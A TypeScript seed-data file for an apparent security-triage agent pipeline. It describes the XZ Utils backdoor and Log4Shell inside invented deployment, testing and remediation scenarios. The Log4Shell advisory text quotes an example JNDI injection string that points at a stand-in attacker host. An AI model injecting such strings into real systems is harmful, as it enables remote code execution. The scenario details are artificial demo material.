/**
 * agents/scenario.ts
 * Realistic seed scenario data for the Murmur security pipeline.
 *
 * Primary scenario: CVE-2024-3094 — XZ Utils / liblzma supply-chain backdoor.
 * This is a real, publicly disclosed critical vulnerability discovered in March 2024.
 * No fake CVE numbers are used.
 *
 * Owner: Person 1 (Agent Logic)
 */

import type { Scenario, DependencyContext, AgentInput } from "../lib/types";

// ---------------------------------------------------------------------------
// Primary Demo Scenario — CVE-2024-3094 (XZ Utils backdoor)
// ---------------------------------------------------------------------------
// Context: A malicious contributor injected a backdoor into xz-utils 5.6.0 and
// 5.6.1 that targeted systemd-linked sshd on affected Linux distributions.
// The backdoor allowed unauthorized remote access by injecting code into the
// RSA key-decryption path of OpenSSH. Affected distributions (Fedora Rawhide,
// openSUSE Tumbleweed, Arch, Debian testing) shipped the vulnerable versions
// before the issue was caught by Microsoft engineer Andres Freund.
// CVSS 3.1 score: 10.0 (CRITICAL).
//
// For this demo we embed this in a Node.js application server that runs on a
// Linux container — the application itself does not call liblzma directly, but
// it runs inside a Debian Bookworm base image whose xz-utils was updated to
// 5.6.1 during an automated OS image rebuild.
// ---------------------------------------------------------------------------

export const PRIMARY_SCENARIO: Scenario = {
  id: "scenario-xz-cve-2024-3094",
  cve: "CVE-2024-3094",
  vulnerability: "XZ Utils / liblzma supply-chain backdoor",
  severity: "CRITICAL",
  affectedPackage: "xz-utils",
  currentVersion: "5.6.1",
  fixedVersion: "5.4.6",
  ecosystem: "debian",
  advisorySummary:
    "Versions 5.6.0 and 5.6.1 of xz-utils contain a malicious backdoor " +
    "injected by a trusted contributor (Jia Tan). The backdoor modifies the " +
    "liblzma shared library to intercept and subvert OpenSSH's RSA key " +
    "decryption path on systems where sshd is linked against systemd and " +
    "systemd uses liblzma. Exploitation requires the attacker to hold the " +
    "matching private key embedded in the malicious code. CVSS 3.1: 10.0.",
  applicationContext:
    "Production API gateway written in Node.js (Next.js/Express hybrid), " +
    "deployed as a Docker container based on Debian Bookworm slim. The container " +
    "runs an OpenSSH sshd daemon for bastion-style maintenance access. The " +
    "application serves ~4 000 authenticated API requests per minute and is " +
    "the single external entry point for all micro-services.",
  usageContext:
    "xz-utils is NOT a direct Node.js dependency. It is an OS-level package " +
    "installed in the Debian Bookworm base image. It was bumped from 5.4.6 to " +
    "5.6.1 during an automated security patch run of the container base image " +
    "on 2024-03-28. The running sshd on this image IS linked against systemd " +
    "which in turn uses liblzma — placing this deployment in the vulnerable " +
    "execution path described by the advisory.",
  dependencyTree: [
    "debian:bookworm-slim (base image)",
    "  └── xz-utils 5.6.1 (OS package — apt)",
    "        └── liblzma.so.5 (shared library)",
    "              └── systemd → sshd (linked at runtime)",
    "                    ↑ BACKDOOR INTERCEPTS RSA KEY DECRYPTION HERE",
  ],
  proposedRemediation:
    "Downgrade xz-utils to the last known-good version (5.4.6) in the " +
    "Dockerfile and rebuild the base image. Pin the apt package to 5.4.6 to " +
    "prevent auto-upgrade. Audit all container images built between 2024-03-01 " +
    "and 2024-04-01 for the vulnerable version.",
  testContext:
    "CI/CD pipeline runs: (1) unit tests (~1 200 tests, ~45 s), " +
    "(2) integration tests against a local Docker Compose stack (~200 tests, " +
    "~4 min), (3) security scan with Trivy on the final image (~1 min). " +
    "There are no dedicated OS-library regression tests; the integration suite " +
    "exercises the SSH maintenance path only in a single smoke test " +
    "('ssh healthcheck command succeeds'). The test suite does NOT exercise " +
    "cryptographic key exchange internals.",
  deploymentContext:
    "Deployed on AWS ECS Fargate (eu-west-1, us-east-1) behind an ALB. " +
    "Deployment strategy: rolling update with a minimum healthy percentage of " +
    "50 % and a maximum of 200 %. Rollback: ECS service update back to " +
    "previous task definition (< 90 s automated rollback). Blue/green is " +
    "available but not currently enabled for this service. " +
    "On-call rotation is active 24 / 7.",
};

// ---------------------------------------------------------------------------
// Dependency context that accompanies the primary scenario
// ---------------------------------------------------------------------------

export const PRIMARY_DEPENDENCY_CONTEXT: DependencyContext = {
  packageName: "xz-utils",
  currentVersion: "5.6.1",
  dependencyType: "transitive",
  dependents: [
    "liblzma.so.5 (OS shared library)",
    "systemd (linked against liblzma)",
    "sshd (openssh-server, linked against systemd)",
  ],
  dependOn: [
    "libc6",
    "libgcc-s1",
  ],
};

// ---------------------------------------------------------------------------
// Convenience: fully wired AgentInput for the primary scenario (no upstream,
// no human correction — suitable for driving the Triage agent cold start).
// ---------------------------------------------------------------------------

export const PRIMARY_AGENT_INPUT: AgentInput = {
  scenario: PRIMARY_SCENARIO,
  dependencyContext: PRIMARY_DEPENDENCY_CONTEXT,
  upstreamContext: null,
  humanCorrection: null,
};

// ---------------------------------------------------------------------------
// Secondary Scenario — CVE-2021-44228 (Log4Shell) — npm application context
// Useful as a second demo beat to show a different ecosystem / dependency type.
// ---------------------------------------------------------------------------

export const SECONDARY_SCENARIO: Scenario = {
  id: "scenario-log4j-cve-2021-44228",
  cve: "CVE-2021-44228",
  vulnerability: "Log4Shell — Apache Log4j2 JNDI remote code execution",
  severity: "CRITICAL",
  affectedPackage: "log4j-core",
  currentVersion: "2.14.1",
  fixedVersion: "2.17.1",
  ecosystem: "maven",
  advisorySummary:
    "A JNDI lookup feature in Log4j2 versions 2.0-beta9 through 2.14.1 allows " +
    "attackers to achieve remote code execution by supplying a crafted " +
    "string (e.g. ${jndi:ldap://attacker.com/a}) that is logged by the " +
    "application. The vulnerability is trivially exploitable and requires no " +
    "authentication. CVSS 3.1: 10.0.",
  applicationContext:
    "Internal Java-based reporting micro-service that aggregates audit events " +
    "from downstream services and writes daily compliance reports to S3. " +
    "Receives structured JSON payloads from an internal SQS queue; user-supplied " +
    "data is logged verbatim for audit trail purposes.",
  usageContext:
    "log4j-core is a DIRECT compile-scope dependency declared in pom.xml. " +
    "The service logs all incoming SQS message bodies at INFO level via " +
    "LogManager.getLogger().info(payload). User-controlled strings (order IDs, " +
    "user-agent headers forwarded from the API gateway) appear in log messages.",
  dependencyTree: [
    "reporting-service (internal Java service)",
    "  └── log4j-core 2.14.1 (direct, compile scope)",
    "        └── log4j-api 2.14.1",
  ],
  proposedRemediation:
    "Upgrade log4j-core to 2.17.1. If upgrade is blocked by transitive " +
    "conflicts, apply the mitigation: set LOG4J_FORMAT_MSG_NO_LOOKUPS=true " +
    "as an environment variable and redeploy immediately as a stop-gap.",
  testContext:
    "Maven Surefire unit tests (~400 tests). Integration tests run against a " +
    "local SQS mock (LocalStack). No tests specifically exercise JNDI lookups " +
    "or the logging formatting path. Existing tests should still pass after " +
    "the log4j upgrade as the public API is unchanged between 2.14.1 and 2.17.1.",
  deploymentContext:
    "Deployed as a Spring Boot fat JAR on AWS EKS (us-east-1). Kubernetes " +
    "rolling update. Rollback via Helm chart previous revision (< 2 min). " +
    "Service is internal-only (not internet-facing), but the SQS messages it " +
    "processes originate from user-submitted data.",
};

export const SECONDARY_DEPENDENCY_CONTEXT: DependencyContext = {
  packageName: "log4j-core",
  currentVersion: "2.14.1",
  dependencyType: "direct",
  dependents: [
    "reporting-service (internal Java service — sole consumer)",
  ],
  dependOn: [
    "log4j-api 2.14.1",
  ],
};

// ---------------------------------------------------------------------------
// All scenarios as a lookup map — useful for seeding / testing
// ---------------------------------------------------------------------------

export const ALL_SCENARIOS: Record<string, Scenario> = {
  [PRIMARY_SCENARIO.id]: PRIMARY_SCENARIO,
  [SECONDARY_SCENARIO.id]: SECONDARY_SCENARIO,
};

export const ALL_DEPENDENCY_CONTEXTS: Record<string, DependencyContext> = {
  [PRIMARY_SCENARIO.id]: PRIMARY_DEPENDENCY_CONTEXT,
  [SECONDARY_SCENARIO.id]: SECONDARY_DEPENDENCY_CONTEXT,
};
